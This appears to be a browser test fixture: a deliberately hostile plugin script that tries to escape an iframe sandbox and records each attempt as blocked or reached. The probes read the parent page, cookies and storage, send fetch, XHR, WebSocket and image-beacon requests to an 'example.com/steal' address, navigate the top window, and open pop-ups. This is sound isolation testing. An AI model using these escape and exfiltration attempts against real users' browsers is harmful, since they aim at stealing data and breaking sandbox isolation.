// The hostile plugin's attempts (tests/fixtures/plugins/hostile). Each is tried and its outcome
// recorded: `blocked` when the browser stopped it (a thrown error, a null result, a value that
// gives nothing away), `reached` when it got at something it should not have. A spec reads
// #attempts, and the results also go back as this plugin's props, so `reached` for any attempt is
// a failure of the isolation. Nothing here ever succeeds under a correct sandbox and CSP.
(function () {
  'use strict';
  var results = {};

  /** Runs `fn`; `reached` only when it returns true, else `blocked` (a throw is blocked too). */
  function tryOne(name, fn) {
    var outcome;
    try {
      outcome = fn() === true ? 'reached' : 'blocked';
    } catch {
      outcome = 'blocked';
    }
    results[name] = outcome;
    var li = document.createElement('li');
    li.dataset.attempt = name;
    li.dataset.outcome = outcome;
    li.textContent = name + ': ' + outcome;
    document.getElementById('attempts').appendChild(li);
  }

  // Read the page that holds the frame (its location, its DOM): an opaque origin cannot.
  tryOne('parent-location', function () {
    return typeof window.parent.location.href === 'string';
  });
  tryOne('parent-dom', function () {
    return !!window.parent.document.body;
  });
  tryOne('top-location', function () {
    return typeof window.top.location.href === 'string';
  });
  // Cookies and storage: an opaque origin has none, and the accessors throw.
  tryOne('cookies', function () {
    return document.cookie.length > 0;
  });
  tryOne('localStorage', function () {
    window.localStorage.setItem('x', '1');
    return window.localStorage.getItem('x') === '1';
  });
  tryOne('sessionStorage', function () {
    window.sessionStorage.setItem('x', '1');
    return window.sessionStorage.getItem('x') === '1';
  });
  tryOne('indexedDB', function () {
    return !!window.indexedDB.open('probe');
  });
  // The network: the CSP's connect-src 'none' blocks fetch, XHR and a WebSocket. These are started
  // and recorded at once; a spec also checks from outside that no request left the frame.
  tryOne('fetch', function () {
    window.fetch('https://example.com/steal').catch(function () {});
    window.fetch('about:blank').catch(function () {});
    return false;
  });
  tryOne('xhr', function () {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://example.com/steal');
    xhr.send();
    return false;
  });
  tryOne('websocket', function () {
    var socket = new WebSocket('wss://example.com/steal');
    return socket.readyState === WebSocket.OPEN;
  });
  tryOne('image-beacon', function () {
    var img = new Image();
    img.src = 'https://example.com/steal.gif?c=' + Date.now();
    return false;
  });
  // Navigate itself or the top away: no allow-top-navigation, and its own navigation ends the
  // frame (the host stops it on the second load).
  tryOne('top-navigate', function () {
    window.top.location.href = 'https://example.com/';
    return false;
  });
  // Open a pop-up: no allow-popups.
  tryOne('popup', function () {
    var win = window.open('https://example.com/', '_blank');
    return !!win;
  });
  // Post to another frame: it has no handle to one but its parent, and the parent takes only
  // `ready` from an opaque origin, nothing else.
  tryOne('post-to-frames', function () {
    for (var i = 0; i < window.parent.frames.length; i++)
      window.parent.frames[i].postMessage({ type: 'init', contract: 'plugin-frame.1' }, '*');
    window.parent.postMessage({ type: 'init', contract: 'plugin-frame.1' }, '*');
    return false;
  });

  var reached = Object.keys(results).filter(function (k) {
    return results[k] === 'reached';
  });
  document.getElementById('summary').textContent = reached.length
    ? 'Reached: ' + reached.join(', ')
    : 'Blocked everything';
  document.getElementById('summary').dataset.reached = String(reached.length);

  // Speak the contract last, and send the results back as props so a spec can read them without
  // the frame (`reached` is empty under a correct sandbox).
  var port = null;
  window.addEventListener('message', function (event) {
    if (port || event.source !== window.parent || !event.data || event.data.type !== 'init') return;
    if (!event.ports || !event.ports[0]) return;
    port = event.ports[0];
    port.onmessage = function () {};
    if (event.data.block && event.data.block.editable && !event.data.block.newer)
      port.postMessage({ type: 'setProps', props: { attempts: results } });
    port.postMessage({ type: 'resize', height: Math.ceil(document.documentElement.scrollHeight) });
  });
  window.parent.postMessage({ type: 'ready', contracts: ['plugin-frame.1'] }, '*');
})();
